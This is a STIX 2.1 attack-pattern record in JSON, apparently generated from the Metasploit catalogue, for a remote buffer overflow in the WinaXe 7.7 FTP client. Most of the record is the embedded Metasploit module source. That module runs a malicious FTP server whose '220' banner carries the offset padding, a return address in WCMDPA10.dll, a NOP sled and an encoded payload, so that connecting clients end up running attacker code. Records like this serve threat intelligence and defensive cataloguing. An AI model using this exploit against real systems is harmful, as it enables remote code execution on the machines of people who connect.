{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8fc4767a-12fd-4671-85a6-fd6b04675ef2",
    "created": "2024-08-14T16:51:19.036252Z",
    "modified": "2024-08-14T16:51:19.036256Z",
    "name": "WinaXe 7.7 FTP Client Remote Buffer Overflow",
    "description": " This module exploits a buffer overflow in the WinaXe 7.7 FTP client. This issue is triggered when a client connects to the server and is expecting the Server Ready response. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ftp/winaxe_server_ready.rb",
            "external_id": "winaxe_server_ready.rb"
        },
        {
            "source_name": "reference",
            "url": "http://hyp3rlinx.altervista.org/advisories/WINAXE-FTP-CLIENT-REMOTE-BUFFER-OVERFLOW.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::FtpServer\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'WinaXe 7.7 FTP Client Remote Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow in the WinaXe 7.7 FTP client.\n        This issue is triggered when a client connects to the server and is\n        expecting the Server Ready response.\n      },\n      'Author' =>\n        [\n          'Chris Higgins',  # msf Module -- @ch1gg1ns\n          'hyp3rlix'        # Original discovery\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'EDB', '40693'],\n          [ 'URL', 'http://hyp3rlinx.altervista.org/advisories/WINAXE-FTP-CLIENT-REMOTE-BUFFER-OVERFLOW.txt' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Payload'        =>\n        {\n          'Space'    => 1000,\n          'BadChars' => \"\\x00\\x0a\\x0d\"\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows Universal',\n            {\n              'Offset' => 2065,\n              'Ret' => 0x68017296 # push esp # ret 0x04 WCMDPA10.dll\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2016-11-03',\n      'DefaultTarget'  => 0))\n  end\n\n  def on_client_unknown_command(c, _cmd, _arg)\n    c.put(\"200 OK\\r\\n\")\n  end\n\n  def on_client_connect(c)\n      print_status(\"Client connected...\")\n\n      sploit =  rand_text(target['Offset'])\n      sploit << [target.ret].pack('V')\n      sploit << make_nops(10)\n      sploit << payload.encoded\n      sploit << make_nops(20)\n\n      c.put(\"220\" + sploit + \"\\r\\n\")\n      c.close\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-11-03",
    "x_mitre_platforms": [
        "win'"
    ]
}